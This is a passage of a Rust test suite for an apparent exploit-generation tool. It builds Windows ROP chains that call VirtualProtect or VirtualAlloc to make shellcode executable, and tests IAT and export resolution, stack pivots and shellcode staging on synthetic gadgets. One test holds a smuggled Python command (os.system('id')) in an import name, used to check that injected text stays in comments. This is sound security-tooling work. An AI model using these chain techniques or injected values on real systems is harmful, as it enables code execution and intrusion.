            if ChainBaseParity::ReturnAddress.entry_rsp_mod16(j) != 8 {
                return Err(ChainError::InvalidWord {
                    index: j,
                    value: c.words[j].value,
                    kind: c.words[j].kind,
                    reason: "misaligned".to_string(),
                });
            }
            Ok(())
        };
        assert!(chain.validate_with(&universe, &[], &[bad_hook]).is_err());
        assert_eq!(ChainBaseParity::Aligned.entry_rsp_mod16(call_idx), 8);
    }

    /// CHWIN-04, the disclosure half: the assumption is echoed where the
    /// user and an agent will actually see it — the script's preamble
    /// comment and the IR's `description` (which is what both front ends
    /// put in their JSON) — and it changes with the parameter.
    #[test]
    fn win64_chain_base_assumption_is_echoed_in_the_ir_and_the_script() {
        let g = win64_pop_set();
        let retaddr =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        assert!(
            retaddr
                .description
                .contains("chain_base_parity=return_address"),
            "{}",
            retaddr.description
        );
        assert!(retaddr
            .script_comment
            .contains("chain base: return_address"));
        let py = retaddr.to_python();
        // py_comment truncates the preamble at PY_COMMENT_MAX, so the
        // assumption has to fit inside it and be visible in the script.
        assert!(py.contains("chain base: return_address"), "{py}");

        let aligned = build_windows_virtualprotect(
            &g,
            &data(),
            &[],
            Arch::X64,
            "pe",
            &WinChainOpts {
                chain_base: ChainBaseParity::Aligned,
                ..opts_with_api()
            },
            &[],
        )
        .unwrap();
        assert!(aligned.description.contains("chain_base_parity=aligned"));
        assert!(aligned.to_python().contains("chain base: aligned"));
    }

    #[test]
    fn chain_base_parity_parses_both_surfaces_spellings() {
        for s in ["aligned", "ALIGNED", " aligned "] {
            assert_eq!(ChainBaseParity::parse(s), Some(ChainBaseParity::Aligned));
        }
        for s in ["return-address", "return_address", "RETURN-ADDRESS"] {
            assert_eq!(
                ChainBaseParity::parse(s),
                Some(ChainBaseParity::ReturnAddress)
            );
        }
        assert_eq!(ChainBaseParity::parse("stack"), None);
        assert_eq!(ChainBaseParity::default(), ChainBaseParity::ReturnAddress);
        assert_eq!(ChainBaseParity::default().as_str(), "return_address");
    }

    /// CHWIN-02. `lpflOldProtect` is an out-parameter: VirtualProtect
    /// writes the previous protection DWORD through it. Aiming it at the
    /// shellcode overwrites the first four bytes of the buffer the call
    /// just made RWX, and the chain returns there.
    #[test]
    fn win64_lpfl_old_protect_never_aliases_the_shellcode() {
        let g = win64_pop_set();
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        let shellcode = chain.words[1].value;
        let old = chain.words[7].value;
        assert_eq!(shellcode, 0x500000);
        assert_ne!(old, shellcode, "the out-parameter aliases the shellcode");
        assert!(
            old < shellcode || old >= shellcode + 4,
            "{old:#x} lands in the shellcode's first DWORD"
        );
        // Still inside the region the call itself makes writable.
        assert!(old >= shellcode && old < shellcode + 0x1000);
        assert_eq!(old % 8, 0, "a DWORD cell the chain can prove is writable");
        assert!(chain.words[7].comment.contains("NOT the shellcode"));
    }

    /// The clean case: a second writable section the protected region does
    /// not cover is preferred over an offset inside the buffer.
    #[test]
    fn win64_scratch_prefers_a_writable_section_outside_the_region() {
        let g = win64_pop_set();
        let chain = build_windows_virtualprotect(
            &g,
            &data_two_writable(),
            &[],
            Arch::X64,
            "pe",
            &opts_with_api(),
            &[],
        )
        .unwrap();
        assert_eq!(chain.words[1].value, 0x500000);
        assert_eq!(chain.words[7].value, 0x600000);
        let a = windows_assumptions(&data_two_writable(), Arch::X64, &opts_with_api()).unwrap();
        assert_eq!(a.shellcode_addr, 0x500000);
        assert_eq!(a.old_protect_addr, Some(0x600000));
    }

    /// A degenerate `--shellcode-size 0` must not make the "is this
    /// section covered by the region?" test vacuous and hand the aliasing
    /// straight back.
    #[test]
    fn win64_zero_size_still_does_not_alias() {
        let opts = WinChainOpts {
            shellcode_size: 0,
            ..opts_with_api()
        };
        let a = windows_assumptions(&data(), Arch::X64, &opts).unwrap();
        assert_eq!(a.shellcode_addr, 0x500000);
        assert_eq!(a.old_protect_addr, Some(0x500008));
    }

    /// CHWIN-07. The IAT gadgets go through `find_exact`, which accepts any
    /// tail of `pop`s, so a `pop rax ; pop rcx ; ret` refills rcx — arg1 —
    /// in the last words before the call. `emit_api_call64` used to pass an
    /// EMPTY already-set list to `ChainBuilder::padding`, so that pop got
    /// `0x4141414141414141` instead of `lpAddress`.
    #[test]
    fn win64_iat_tail_pops_do_not_destroy_argument_registers() {
        let g = win64_iat_extra_pop_set();
        let chain = build_windows_virtualprotect(
            &g,
            &data(),
            &vp_import(),
            Arch::X64,
            "pe",
            &WinChainOpts::default(), // no api_addr → IAT path
            &[],
        )
        .unwrap();
        let lp_address = chain.words[1].value;
        assert_eq!(lp_address, 0x500000);
        let iat = chain
            .words
            .iter()
            .position(|w| w.comment.contains("@ IAT"))
            .unwrap();
        // The word right after the IAT slot is the `pop rcx` tail operand.
        let refill = &chain.words[iat + 1];
        assert_eq!(refill.kind, WordKind::Padding);
        assert_ne!(
            refill.value, PADDING64,
            "the tail `pop rcx` was handed the padding constant, destroying lpAddress"
        );
        assert_eq!(refill.value, lp_address);
        assert!(
            refill.comment.contains("without overwrite rcx"),
            "{refill:?}"
        );
        // Nothing anywhere in the chain re-arms an argument register with
        // the padding constant after it was populated.
        for (reg_word, name) in [(1usize, "rcx"), (3, "rdx"), (5, "r8"), (7, "r9")] {
            let _ = name;
            assert_ne!(chain.words[reg_word].value, PADDING64);
        }
    }

    /// Same family: a tail `pop rax` between the dereference and the
    /// transfer would replace the resolved API address itself.
    #[test]
    fn win64_iat_gadget_that_pops_rax_is_refused() {
        let mut g = win64_pop_set();
        g[5] = gadget(0x1050, "mov rax, qword ptr [rax] ; pop rax ; ret");
        let err = build_windows_virtualprotect(
            &g,
            &data(),
            &vp_import(),
            Arch::X64,
            "pe",
            &WinChainOpts::default(),
            &[],
        )
        .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("pops rax"), "{msg}");
        assert!(msg.contains("CHWIN-07"), "{msg}");
    }

    #[test]
    fn win64_fallback_and_structured_scarcity_error() {
        let g = win64_fallback_set();
        let err =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("r9"), "{msg}");
        assert!(msg.contains("pop r9"), "{msg}");
        assert!(msg.contains("mov r9, rax"), "{msg}");
    }

    #[test]
    fn win64_mov_fallback_chain_uses_rax_route() {
        // r9 fallback succeeds when mov r9, rax exists.
        let mut g = win64_fallback_set();
        g.push(gadget(0x1090, "mov r9, rax ; ret"));
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        assert!(chain
            .gadgets
            .iter()
            .any(|gr| gr.text == "mov r9, rax ; ret"));
        // every gadget word references a real scan gadget
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
    }

    #[test]
    fn win64_iat_resolution_path() {
        let g = win64_pop_set();
        let chain = build_windows_virtualprotect(
            &g,
            &data(),
            &vp_import(),
            Arch::X64,
            "pe",
            &WinChainOpts::default(), // no api_addr → IAT
            &[],
        )
        .unwrap();
        let texts: Vec<&str> = chain.words.iter().map(|w| w.comment.as_str()).collect();
        let iat = texts
            .iter()
            .position(|t| t.contains("@ IAT VirtualProtect"))
            .unwrap();
        assert_eq!(chain.words[iat].value, 0x502000);
        // pop rax → @IAT → mov rax, [rax] → (ret slide?) → jmp rax
        assert!(chain.words[iat - 1].comment.starts_with("pop rax"));
        assert!(chain.words[iat + 1]
            .comment
            .starts_with("mov rax, qword ptr [rax]"));
        let jmp = texts.iter().position(|t| *t == "jmp rax").unwrap();
        // jmp rax is the transfer word; under the default `return_address`
        // chain base it must be at an ODD index (CHWIN-04).
        assert_eq!(jmp % 2, 1);
        assert_eq!(ChainBaseParity::ReturnAddress.entry_rsp_mod16(jmp), 8);
    }

    /// CHWIN-03. The word that `mov rax, qword ptr [rax]` dereferences must
    /// be the IAT slot — the pointer-sized cell the loader patches — and
    /// never the `IMAGE_IMPORT_BY_NAME` record, which holds `VirtualProtect`
    /// as ASCII. Deref the wrong one and rax becomes 0x74726956... .
    #[test]
    fn win64_iat_word_is_the_slot_not_the_hint_name_record() {
        let g = win64_pop_set();
        let imports = vp_import();
        let imp = &imports[0];
        assert_ne!(
            imp.iat_slot_vaddr, imp.hint_name_vaddr,
            "the fixture must distinguish the two addresses"
        );
        let chain = build_windows_virtualprotect(
            &g,
            &data(),
            &imports,
            Arch::X64,
            "pe",
            &WinChainOpts::default(), // no api_addr → IAT path
            &[],
        )
        .unwrap();
        let word = chain
            .words
            .iter()
            .find(|w| w.comment.contains("@ IAT VirtualProtect"))
            .expect("IAT word");
        assert_eq!(word.value, imp.iat_slot_vaddr);
        assert_ne!(word.value, imp.hint_name_vaddr);
        // A pointer cell is pointer-aligned; a hint/name record is not.
        assert_eq!(word.value % 8, 0, "{:#x} is not a 64-bit slot", word.value);
        // Nothing anywhere in the chain leaks the hint/name address.
        assert!(
            !chain.words.iter().any(|w| w.value == imp.hint_name_vaddr),
            "hint/name record {:#x} must never appear in a chain",
            imp.hint_name_vaddr
        );
    }

    #[test]
    fn win64_iat_missing_import_is_clean_error() {
        let g = win64_pop_set();
        let err = build_windows_virtualprotect(
            &g,
            &data(),
            &[], // PE imports nothing relevant
            Arch::X64,
            "pe",
            &WinChainOpts::default(),
            &[],
        )
        .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("does not import VirtualProtect"), "{msg}");
        assert!(msg.contains("--api-addr"), "{msg}");
        assert!(msg.contains("--api-name"), "{msg}");
    }

    /// CHWIN-06. The API name was hardcoded, so the IAT path could only ever
    /// be reached by a PE importing `VirtualProtect` — which neither shipped
    /// cmd.exe fixture does (both import `VirtualAlloc`, `VirtualFree` and
    /// `VirtualQuery`; measured with `--info`). With `--api-name` the same
    /// gadgets resolve through the import the PE actually has.
    #[test]
    fn win64_api_name_reaches_the_iat_path_for_virtualalloc() {
        let g = win64_pop_set();
        let imports = import_named("VirtualAlloc");
        // The default name cannot resolve against this PE at all…
        let err = build_windows_virtualprotect(
            &g,
            &data(),
            &imports,
            Arch::X64,
            "pe",
            &WinChainOpts::default(),
            &[],
        )
        .unwrap_err();
        assert!(err.to_string().contains("does not import VirtualProtect"));
        // …and naming the API the PE does import reaches the IAT.
        let opts = WinChainOpts {
            api_name: "VirtualAlloc".to_string(),
            ..WinChainOpts::default()
        };
        let chain =
            build_windows_virtualprotect(&g, &data(), &imports, Arch::X64, "pe", &opts, &[])
                .unwrap();
        let iat = chain
            .words
            .iter()
            .find(|w| w.comment.contains("@ IAT VirtualAlloc"))
            .expect("the IAT word names the requested API");
        assert_eq!(iat.value, 0x502000);
        assert!(chain.description.contains("VirtualAlloc"));
        assert!(chain.script_comment.contains("VirtualAlloc"));
    }

    /// CHWIN-06's other half: same arg COUNT is not same arg MEANING.
    /// VirtualAlloc's third and fourth arguments are `flAllocationType` and
    /// `flProtect`, and it has no out-parameter at all.
    #[test]
    fn virtualalloc_uses_its_own_argument_recipe() {
        let g = win64_pop_set();
        let opts = WinChainOpts {
            api_name: "VirtualAlloc".to_string(),
            ..opts_with_api()
        };
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[]).unwrap();
        assert_eq!(chain.words[1].value, 0x500000, "arg1 lpAddress");
        assert_eq!(chain.words[3].value, 0x1000, "arg2 dwSize");
        assert_eq!(chain.words[5].value, MEM_COMMIT, "arg3 flAllocationType");
        assert!(chain.words[5].comment.contains("MEM_COMMIT"));
        assert_eq!(chain.words[7].value, 0x40, "arg4 flProtect");
        assert!(chain.words[7].comment.contains("flProtect"));
        assert!(!chain.words[7].comment.contains("lpflOldProtect"));
        // No out-parameter means CHWIN-02 has nothing to alias.
        let a = windows_assumptions(&data(), Arch::X64, &opts).unwrap();
        assert_eq!(a.old_protect_addr, None);
        assert_eq!(a.api_name, "VirtualAlloc");
        // x86 stdcall carries the same recipe split.
        let x86 =
            build_windows_virtualprotect(&[], &data(), &[], Arch::X86, "pe", &opts, &[]).unwrap();
        let values: Vec<u64> = x86.words.iter().map(|w| w.value).collect();
        assert_eq!(
            values,
            vec![
                0x7fff_1234_0000,
                0x500000,
                0x500000,
                0x1000,
                MEM_COMMIT,
                0x40
            ]
        );
    }

    #[test]
    fn unsupported_api_name_is_refused_rather_than_guessed() {
        let opts = WinChainOpts {
            api_name: "VirtualProtectEx".to_string(),
            ..opts_with_api()
        };
        let err = build_windows_virtualprotect(
            &win64_pop_set(),
            &data(),
            &[],
            Arch::X64,
            "pe",
            &opts,
            &[],
        )
        .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("VirtualProtectEx"), "{msg}");
        assert!(msg.contains("VirtualProtect and VirtualAlloc"), "{msg}");
        assert!(windows_assumptions(&data(), Arch::X64, &opts).is_err());
        assert_eq!(
            ApiRecipe::for_name("virtualalloc"),
            Some(ApiRecipe::VirtualAlloc)
        );
        assert_eq!(ApiRecipe::for_name("nope"), None);
    }

    /// `--prot` (CHWIN-08's user-selectable protection) is carried into the
    /// argument word and named in the comment for both recipes.
    #[test]
    fn new_protect_is_a_parameter_and_is_labelled() {
        let g = win64_pop_set();
        let opts = WinChainOpts {
            new_protect: 0x20,
            ..opts_with_api()
        };
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[]).unwrap();
        assert_eq!(chain.words[5].value, 0x20);
        assert!(chain.words[5].comment.contains("PAGE_EXECUTE_READ"));
        assert!(chain.description.contains("PAGE_EXECUTE_READ"));
        assert_eq!(protect_label(0x1234), "0x1234");
    }

    #[test]
    fn win32_stdcall_layout() {
        let chain = build_windows_virtualprotect(
            &[], // no gadgets needed at all
            &data(),
            &[],
            Arch::X86,
            "pe",
            &opts_with_api(),
            &[],
        )
        .unwrap();
        assert_eq!(chain.word_size, 4);
        let values: Vec<u64> = chain.words.iter().map(|w| w.value).collect();
        // CHWIN-02: the last word is the scratch DWORD, no longer the
        // shellcode address a second time.
        assert_eq!(
            values,
            vec![0x7fff_1234_0000, 0x500000, 0x500000, 0x1000, 0x40, 0x500ffc]
        );
        assert_eq!(chain.words[0].kind, WordKind::CodeAddr);
        assert!(chain.words[1].comment.contains("ret 0x10"));
        assert_ne!(values[5], values[1], "CHWIN-02 (x86): out-param aliasing");
    }

    /// x86 IAT gadget set: the same three-step dereference as x64.
    fn win32_iat_set() -> Vec<Gadget> {
        vec![
            gadget(0x1000, "pop eax ; ret"),
            gadget(0x1010, "mov eax, dword ptr [eax] ; ret"),
            gadget(0x1020, "jmp eax"),
            gadget(0x1030, "ret"),
        ]
    }

    /// CHWIN-08 #4: without `--api-addr` the x86 builder used to refuse
    /// outright ("x86 IAT dereference not implemented"). It now resolves
    /// through the import table, and says which gadget is missing when it
    /// cannot.
    #[test]
    fn chwin08_x86_iat_names_the_missing_gadget() {
        let err = build_windows_virtualprotect(
            &[],
            &data(),
            &vp_import(),
            Arch::X86,
            "pe",
            &WinChainOpts::default(),
            &[],
        )
        .unwrap_err();
        let m = err.to_string();
        assert!(m.contains("pop eax"), "{m}");
        assert!(
            !m.contains("not implemented"),
            "the x86 IAT path is implemented now: {m}"
        );
    }

    /// CHWIN-08 #4: the chain resolves VirtualProtect from the PE's own
    /// import table, with no leaked runtime address at all.
    #[test]
    fn chwin08_x86_iat_chain_resolves_through_the_import_table() {
        let chain = build_windows_virtualprotect(
            &win32_iat_set(),
            &data(),
            &vp_import(),
            Arch::X86,
            "pe",
            &WinChainOpts::default(),
            &[],
        )
        .unwrap();
        // The IAT SLOT is the word that gets dereferenced (CHWIN-03).
        assert!(
            chain
                .words
                .iter()
                .any(|w| w.value == 0x502000 && w.kind == WordKind::DataAddr),
            "the IAT slot must be a chain word: {:?}",
            chain.words.iter().map(|w| w.value).collect::<Vec<_>>()
        );
        let texts: Vec<String> = chain
            .words
            .iter()
            .filter(|w| w.kind == WordKind::GadgetAddr)
            .map(|w| w.comment.clone())
            .collect();
        assert!(texts
            .iter()
            .any(|t| t.starts_with("mov eax, dword ptr [eax]")));
        assert!(texts.iter().any(|t| t.starts_with("jmp eax")));
        // The stdcall frame follows the transfer: return address then four
        // arguments, and arg4 must not alias the shellcode (CHWIN-02).
        let after: Vec<&ChainWord> = chain
            .words
            .iter()
            .skip_while(|w| !w.comment.starts_with("jmp eax"))
            .skip(1)
            .collect();
        assert_eq!(after.len(), 5, "return address + four stdcall arguments");
        assert_ne!(after[4].value, after[1].value);
    }

    /// CHWIN-08 #1: the pivot prologue is two words, and the body's
    /// alignment is measured from the pivot address rather than declared.
    #[test]
    fn chwin08_stack_pivot_emits_a_two_word_prologue() {
        let mut g = win64_pop_set();
        g.push(gadget(0x10a0, "pop rsp ; ret"));
        let mut opts = opts_with_api();
        opts.pivot = Some(0x41410000);
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[]).unwrap();
        assert!(chain.words[0].comment.starts_with("pop rsp"));
        assert_eq!(chain.words[1].value, 0x41410000);
        assert!(chain.words[1].comment.contains("--pivot"));
        assert!(chain.description.contains("PIVOTED"));
        let a = windows_assumptions(&data(), Arch::X64, &opts).unwrap();
        assert_eq!(a.pivot_addr, Some(0x41410000));
        assert_eq!(a.pivot_words, PIVOT_WORDS);
    }

    /// A pivot target that is neither 0 nor 8 mod 16 cannot satisfy the
    /// Win64 entry condition at all, and is refused rather than emitted.
    #[test]
    fn chwin08_pivot_parity_is_measured_not_assumed() {
        let mut g = win64_pop_set();
        g.push(gadget(0x10a0, "pop rsp ; ret"));
        let mut opts = opts_with_api();
        opts.pivot = Some(0x41410004);
        let err = build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[])
            .unwrap_err();
        assert!(err.to_string().contains("mod 16"), "{err}");
    }

    /// CHWIN-08 #5: `--stage` writes the shellcode into the region with
    /// write-what-where gadgets instead of assuming it is already there.
    #[test]
    fn chwin08_staging_writes_the_shellcode_words() {
        let mut g = win64_pop_set();
        g.push(gadget(0x10b0, "mov qword ptr [rdi], rsi ; ret"));
        g.push(gadget(0x10c0, "pop rdi ; ret"));
        g.push(gadget(0x10d0, "pop rsi ; ret"));
        let mut opts = opts_with_api();
        opts.stage = vec![0x90, 0x90, 0x90, 0xcc];
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[]).unwrap();
        let staged = chain
            .words
            .iter()
            .find(|w| w.comment.starts_with("staged shellcode word"))
            .expect("a staged shellcode word");
        assert_eq!(staged.kind, WordKind::Immediate);
        assert!(chain.description.contains("stages 4 bytes"));
    }

    /// CHWIN-08 #2: two API calls in one chain, with the first returning
    /// into a stack-adjust gadget rather than into an address the exploit
    /// would have to know.
    #[test]
    fn chwin08_multi_call_composition_returns_into_the_chain() {
        let mut g = win64_pop_set();
        // Exactly four pop slots and a bare ret: discards the shadow space.
        g.push(gadget(
            0x10e0,
            "pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret",
        ));
        let mut opts = opts_with_api();
        opts.extra_calls = vec![("VirtualProtect".to_string(), Some(0x7fff00001000))];
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[]).unwrap();
        let calls: Vec<&ChainWord> = chain
            .words
            .iter()
            .filter(|w| w.kind == WordKind::CodeAddr && w.comment.contains("--api-addr"))
            .collect();
        assert_eq!(calls.len(), 2, "two composed API calls");
        assert!(
            chain
                .words
                .iter()
                .any(|w| w.comment.starts_with("pop r12 ; pop r13")),
            "the non-final return address is the stack-adjust gadget"
        );
        assert!(
            chain.description.contains(" then "),
            "{}",
            chain.description
        );
    }

    /// ECO-04: the exit criterion's shape, on a gadget set that reproduces
    /// pe-x64-cmd-v6.1.7601's scarcity — rcx is reachable, rdx is not.
    #[test]
    fn eco04_plan_windows_names_set_rdx_and_keeps_the_satisfied_ones() {
        let plan = plan_windows(
            &win64_fallback_set(),
            &data(),
            &vp_import(),
            Arch::X64,
            "pe",
            &opts_with_api(),
            &[],
        );
        assert!(!plan.feasible);
        assert!(plan.error.is_some());
        // The four argument registers come from `win64_args`, so the plan
        // cannot drift from the recipe the builder uses.
        for id in [
            "set_rcx",
            "set_rdx",
            "set_r8",
            "set_r9",
            "stack_align",
            "api_transfer",
        ] {
            assert!(plan.requirement(id).is_some(), "missing requirement {id}");
        }
        let rdx = plan.requirement("set_rdx").unwrap();
        assert!(rdx.satisfied, "this set HAS `mov rdx, rax`");
        let r9 = plan.requirement("set_r9").unwrap();
        assert!(!r9.satisfied, "this set has no r9 route at all");
        assert_eq!(r9.strategies_tried.len(), 2);
        assert!(r9.strategies_tried.iter().all(|s| s.candidates == 0));
        // ...and the satisfied ones carry the gadget that satisfies them.
        let sat = plan
            .satisfied_requirements
            .iter()
            .find(|s| s.id == "set_rcx")
            .expect("set_rcx is satisfied");
        assert_eq!(sat.vaddr, 0x1000);
        assert_eq!(sat.text, "pop rcx ; ret");
        assert_eq!(
            plan.assumptions.chain_base_parity.as_deref(),
            Some("return_address")
        );
    }

    /// CHWIN-08 #3: export-table resolution. The target itself exports the
    /// API, so the transfer costs ONE word and no gadgets: no leak, no IAT
    /// dereference. `--api-addr` still wins when the caller supplies one,
    /// because an operator with a leak knows more than the file does.
    #[test]
    fn chwin08_export_table_resolves_the_api_without_a_leak() {
        let mut opts = WinChainOpts {
            exports: vec![PeExport {
                name: "virtualprotect".into(),
                vaddr: 0x1400_0100e,
            }],
            ..WinChainOpts::default()
        };
        // No --api-addr and no import: only the export can resolve it.
        let chain = build_windows_virtualprotect(
            &win64_pop_set(),
            &data(),
            &[],
            Arch::X64,
            "pe",
            &opts,
            &[],
        )
        .unwrap();
        let call = chain
            .words
            .iter()
            .find(|w| w.kind == WordKind::CodeAddr && w.comment.contains("export table"))
            .expect("the export-resolved call word");
        assert_eq!(call.value, 0x1400_0100e);
        // An explicit address still takes precedence.
        opts.api_addr = Some(0x7fff_0000_0000);
        let chain = build_windows_virtualprotect(
            &win64_pop_set(),
            &data(),
            &[],
            Arch::X64,
            "pe",
            &opts,
            &[],
        )
        .unwrap();
        assert!(chain
            .words
            .iter()
            .any(|w| w.value == 0x7fff_0000_0000 && w.comment.contains("--api-addr")));
        // ...and the plan reports the strategy that answered.
        opts.api_addr = None;
        let plan = plan_windows(&win64_pop_set(), &data(), &[], Arch::X64, "pe", &opts, &[]);
        assert!(plan.feasible, "{:?}", plan.error);
        let t = plan.requirement("api_transfer").unwrap();
        assert!(t.satisfied);
        assert!(t
            .strategies_tried
            .iter()
            .any(|s| s.pattern.starts_with("export table") && s.candidates == 1));
        // No leak is needed when the address is in the file.
        assert!(!plan.assumptions.needs_leak);
    }

    /// ECO-04: an unsupported target is a RESULT. `plan_chain` never fails.
    #[test]
    fn eco04_plan_windows_never_fails() {
        let plan = plan_windows(
            &win64_pop_set(),
            &data(),
            &vp_import(),
            Arch::Arm64,
            "pe",
            &WinChainOpts::default(),
            &[],
        );
        assert!(!plan.feasible);
        assert!(plan.requirement("target_supported").is_some());
        assert!(plan.error.unwrap().contains("not supported yet"));
    }

    /// ECO-04: a feasible target reports feasible, with a word count.
    #[test]
    fn eco04_plan_windows_agrees_with_the_builder() {
        let plan = plan_windows(
            &win64_pop_set(),
            &data(),
            &vp_import(),
            Arch::X64,
            "pe",
            &opts_with_api(),
            &[],
        );
        assert!(plan.feasible, "{:?}", plan.error);
        assert!(plan.requirements.iter().all(|r| r.satisfied));
        let chain = build_windows_virtualprotect(
            &win64_pop_set(),
            &data(),
            &vp_import(),
            Arch::X64,
            "pe",
            &opts_with_api(),
            &[],
        )
        .unwrap();
        assert_eq!(plan.word_count, Some(chain.words.len()));
    }

    /// CHWIN-08 #1: the pivot's stack accounting. `pop rsp` used to make the
    /// verifier abstain from that word on; it now models the relocation and
    /// says where it happened.
    #[test]
    fn chwin08_pivoted_chain_is_still_statically_accounted() {
        let mut g = win64_pop_set();
        g.push(gadget(0x10a0, "pop rsp ; ret"));
        let mut opts = opts_with_api();
        opts.pivot = Some(0x41410000);
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts, &[]).unwrap();
        let acct = chain.verify_stack_accounting().unwrap();
        assert_eq!(acct.pivot_at, Some(1), "the pivot target is chain word 1");
        assert!(
            acct.words_verified() > PIVOT_WORDS,
            "the walk continued past the pivot: {}",
            acct.stop_reason
        );
    }

    #[test]
    fn windows_rejects_non_pe_and_no_writable() {
        let err = build_windows_virtualprotect(
            &win64_pop_set(),
            &data(),
            &[],
            Arch::X64,
            "elf",
            &opts_with_api(),
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, ChainError::Unsupported { .. }));
        let err = build_windows_virtualprotect(
            &win64_pop_set(),
            &[],
            &[],
            Arch::X64,
            "pe",
            &opts_with_api(),
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, ChainError::NoWritableSection));
    }

    /// ROB-01 end to end: a PE whose import DLL name carries Python must
    /// not produce a script that runs it.
    #[test]
    fn iat_dll_name_cannot_inject_python() {
        let g = win64_pop_set();
        let chain = build_windows_virtualprotect(
            &g,
            &data(),
            &poisoned_import(),
            Arch::X64,
            "pe",
            &WinChainOpts::default(), // no api_addr → IAT path
            &[],
        )
        .unwrap();
        // The IR itself is already clean: no control characters survive.
        let iat = chain
            .words
            .iter()
            .find(|w| w.comment.contains("@ IAT"))
            .unwrap();
        assert!(!iat.comment.contains('\n') && !iat.comment.contains('\r'));

        let py = chain.to_python();
        // The text still appears — it is not silently dropped — but only
        // ever as comment text.
        assert!(py.contains("os.system('id')"), "{py}");
        for line in py.lines() {
            assert!(
                !line.starts_with("import os"),
                "injected top-level statement: {line:?}"
            );
        }
        crate::tests::assert_only_in_comment(&py, "import os");
        crate::tests::assert_only_in_comment(&py, "os.system('id')");
        crate::tests::assert_flat_python_script(&py);
        crate::tests::assert_python_parses(&py);
    }

    /// ROB-05 + ROB-01: every windows-virtualprotect script this builder
    /// can produce is valid, flat Python. The real shipped fixture
    /// `tests/fixtures/pe-x64-cmd-v6.1.7601` cannot be used here — the
    /// builder returns `can't find a suitable gadget: cannot populate rdx`
    /// on it (the spike's "common case on real PEs") — so the synthetic
    /// gadget sets above cover every code path instead.
    #[test]
    fn every_generated_chain_script_is_flat_python() {
        let pop_set = win64_pop_set();
        let mut autopad = win64_pop_set();
        autopad[3] = gadget(0x1030, "pop r9 ; pop rbx ; ret");
        let mut fallback = win64_fallback_set();
        fallback.push(gadget(0x1090, "mov r9, rax ; ret"));
        let alloc_opts = WinChainOpts {
            api_name: "VirtualAlloc".to_string(),
            ..opts_with_api()
        };

        let cases: Vec<(&str, RopChain)> = vec![
            (
                "x64 --api-addr",
                build_windows_virtualprotect(
                    &pop_set,
                    &data(),
                    &[],
                    Arch::X64,
                    "pe",
                    &opts_with_api(),
                    &[],
                )
                .unwrap(),
            ),
            (
                "x64 no alignment slide",
                build_windows_virtualprotect(
                    &autopad,
                    &data(),
                    &[],
                    Arch::X64,
                    "pe",
                    &opts_with_api(),
                    &[],
                )
                .unwrap(),
            ),
            (
                "x64 aligned chain base",
                build_windows_virtualprotect(
                    &pop_set,
                    &data(),
                    &[],
                    Arch::X64,
                    "pe",
                    &WinChainOpts {
                        chain_base: ChainBaseParity::Aligned,
                        ..opts_with_api()
                    },
                    &[],
                )
                .unwrap(),
            ),
            (
                "x64 IAT",
                build_windows_virtualprotect(
                    &pop_set,
                    &data(),
                    &vp_import(),
                    Arch::X64,
                    "pe",
                    &WinChainOpts::default(),
                    &[],
                )
                .unwrap(),
            ),
            (
                "x64 IAT with a tail pop (CHWIN-07)",
                build_windows_virtualprotect(
                    &win64_iat_extra_pop_set(),
                    &data(),
                    &vp_import(),
                    Arch::X64,
                    "pe",
                    &WinChainOpts::default(),
                    &[],
                )
                .unwrap(),
            ),
            (
                "x64 rax fallback",
                build_windows_virtualprotect(
                    &fallback,
                    &data(),
                    &[],
                    Arch::X64,
                    "pe",
                    &opts_with_api(),
                    &[],
                )
                .unwrap(),
            ),
            (
                "x64 VirtualAlloc",
                build_windows_virtualprotect(
                    &pop_set,
                    &data(),
                    &[],
                    Arch::X64,
                    "pe",
                    &alloc_opts,
                    &[],
                )
                .unwrap(),
            ),
            (
                "x86 stdcall",
                build_windows_virtualprotect(
                    &[],
                    &data(),
                    &[],
                    Arch::X86,
                    "pe",
                    &opts_with_api(),
                    &[],
                )
                .unwrap(),
            ),
        ];

        for (label, chain) in &cases {
            let py = chain.to_python();
            assert!(!py.contains('\t'), "{label}: tab in script\n{py}");
            crate::tests::assert_flat_python_script(&py);
            crate::tests::assert_python_parses(&py);
            // CHLX-04: every emitted chain accounts for its own words.
            chain
                .verify_stack_accounting()
                .unwrap_or_else(|e| panic!("{label}: {e}"));
            if chain.word_size == 8 {
                // every Win64 chain carries shadow-space padding words —
                // the words ROB-05 used to indent.
                assert!(
                    chain.words.iter().any(|w| w.kind == WordKind::Padding),
                    "{label}: expected padding words"
                );
            }
        }
    }

    #[test]
    fn badbyte_in_api_addr_fails_validation() {
        let mut o = opts_with_api();
        o.api_addr = Some(0x7fff_0a34_0000);
        let err = build_windows_virtualprotect(
            &win64_pop_set(),
            &data(),
            &[],
            Arch::X64,
            "pe",
            &o,
            &[0x0a],
        )
        .unwrap_err();
        assert!(matches!(err, ChainError::InvalidWord { .. }), "{err}");
    }
}
